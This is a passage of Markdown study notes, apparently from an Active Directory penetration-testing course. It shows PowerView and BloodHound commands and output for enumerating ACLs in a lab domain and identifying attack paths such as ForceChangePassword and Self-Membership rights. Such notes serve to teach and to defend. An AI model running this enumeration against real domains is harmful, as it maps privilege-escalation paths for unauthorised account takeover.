+IdentityReferenceDN     : CN=Exchange Windows Permissions,OU=Microsoft Exchange Security 
+                          Groups,DC=INLANEFREIGHT,DC=LOCAL
+IdentityReferenceClass  : group
+
+ObjectDN                : DC=INLANEFREIGHT,DC=LOCAL
+AceQualifier            : AccessAllowed
+ActiveDirectoryRights   : ExtendedRight
+ObjectAceType           : 00299570-246d-11d0-a768-00aa006e0529
+AceFlags                : ContainerInherit
+AceType                 : AccessAllowedObject
+InheritanceFlags        : ContainerInherit
+SecurityIdentifier      : S-1-5-21-3842939050-3880317879-2865463114-5189
+IdentityReferenceName   : Exchange Windows Permissions
+IdentityReferenceDomain : INLANEFREIGHT.LOCAL
+IdentityReferenceDN     : CN=Exchange Windows Permissions,OU=Microsoft Exchange Security 
+                          Groups,DC=INLANEFREIGHT,DC=LOCAL
+IdentityReferenceClass  : group
+
+<SNIP>
+```
+
+Now, there is a way to use a tool such as PowerView more effectively -- by performing targeted enumeration starting with a user that we have control over.
+
+```powershell
+PS C:\htb> Import-Module .\PowerView.ps1
+PS C:\htb> $sid = Convert-NameToSid wley
+```
+
+We can then use the `Get-DomainObjectACL` function to perform our targeted search
+
+```powershell
+PS C:\htb> Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}
+
+ObjectDN               : CN=Dana Amundsen,OU=DevOps,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+ObjectSID              : S-1-5-21-3842939050-3880317879-2865463114-1176
+ActiveDirectoryRights  : ExtendedRight
+ObjectAceFlags         : ObjectAceTypePresent
+ObjectAceType          : 00299570-246d-11d0-a768-00aa006e0529
+InheritedObjectAceType : 00000000-0000-0000-0000-000000000000
+BinaryLength           : 56
+AceQualifier           : AccessAllowed
+IsCallback             : False
+OpaqueLength           : 0
+AccessMask             : 256
+SecurityIdentifier     : S-1-5-21-3842939050-3880317879-2865463114-1181
+AceType                : AccessAllowedObject
+AceFlags               : ContainerInherit
+IsInherited            : False
+InheritanceFlags       : ContainerInherit
+PropagationFlags       : None
+AuditFlags             : None
+```
+
+We could Google for the GUID value `00299570-246d-11d0-a768-00aa006e0529` and uncover [this](https://docs.microsoft.com/en-us/windows/win32/adschema/r-user-force-change-password) page showing that the user has the right to force change the other user's password.
+
+Alternatively, we could do a reverse search using PowerShell to map the right name back to the GUID value.
+
+```powershell
+PS C:\htb> $guid= "00299570-246d-11d0-a768-00aa006e0529"
+PS C:\htb> Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * |Select Name,DisplayName,DistinguishedName,rightsGuid| ?{$_.rightsGuid -eq $guid} | fl
+
+Name              : User-Force-Change-Password
+DisplayName       : Reset Password
+DistinguishedName : CN=User-Force-Change-Password,CN=Extended-Rights,CN=Configuration,DC=INLANEFREIGHT,DC=LOCAL
+rightsGuid        : 00299570-246d-11d0-a768-00aa006e0529
+```
+
+PowerView has the `ResolveGUIDs` flag, which does this very thing for us. Notice how the output changes when we include this flag to show the human-readable format of the `ObjectAceType` property as `User-Force-Change-Password`.
+
+```powershell
+PS C:\htb> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid} 
+
+AceQualifier           : AccessAllowed
+ObjectDN               : CN=Dana Amundsen,OU=DevOps,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+ActiveDirectoryRights  : ExtendedRight
+ObjectAceType          : User-Force-Change-Password
+ObjectSID              : S-1-5-21-3842939050-3880317879-2865463114-1176
+InheritanceFlags       : ContainerInherit
+BinaryLength           : 56
+AceType                : AccessAllowedObject
+ObjectAceFlags         : ObjectAceTypePresent
+IsCallback             : False
+PropagationFlags       : None
+SecurityIdentifier     : S-1-5-21-3842939050-3880317879-2865463114-1181
+AccessMask             : 256
+AuditFlags             : None
+IsInherited            : False
+AceFlags               : ContainerInherit
+InheritedObjectAceType : All
+OpaqueLength           : 0
+```
+
+```powershell
+
+PS C:\tools> $sid = Convert-NameToSid forend
+PS C:\tools> Get-DomainObjectACL -ResolveGUIDs -Identity "GPO Management" | ? {$_.SecurityIdentifier -eq $sid}
+
+
+AceQualifier           : AccessAllowed
+ObjectDN               : CN=GPO Management,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+ActiveDirectoryRights  : Self
+ObjectAceType          : Self-Membership
+ObjectSID              : S-1-5-21-3842939050-3880317879-2865463114-4046
+InheritanceFlags       : ContainerInherit
+BinaryLength           : 56
+AceType                : AccessAllowedObject
+ObjectAceFlags         : ObjectAceTypePresent
+IsCallback             : False
+PropagationFlags       : None
+SecurityIdentifier     : S-1-5-21-3842939050-3880317879-2865463114-5614
+AccessMask             : 8
+AuditFlags             : None
+IsInherited            : False
+AceFlags               : ContainerInherit
+InheritedObjectAceType : All
+OpaqueLength           : 0
+
+<SNIP>
+```
+## BloodHound
+
+we can set the `wley` user as our starting node, select the `Node Info` tab and scroll down to `Outbound Control Rights`. This option will show us objects we have control over directly, via group membership, and the number of objects that our user could lead to us controlling via ACL attack paths under `Transitive Object Control`. If we click on the `1` next to `First Degree Object Control`, we see the first set of rights that we enumerated, `ForceChangePassword` over the `damundsen` user.
+
+![](images/Pasted%20image%2020260108145039.png)
+
+If we right-click on the line between the two objects, a menu will pop up. If we select `Help`, we will be presented with help around abusing this ACE, including:
+
+- More info on the specific right, tools, and commands that can be used to pull off this attack
+- Operational Security (Opsec) considerations
+- External references.
+
+![](images/Pasted%20image%2020260108145146.png)
+
+If we click on the `16` next to `Transitive Object Control`, we will see the entire path that we painstakingly enumerated above. From here, we could leverage the help menus for each edge to find ways to best pull off each attack.
+
+![](images/Pasted%20image%2020260108145217.png)
 
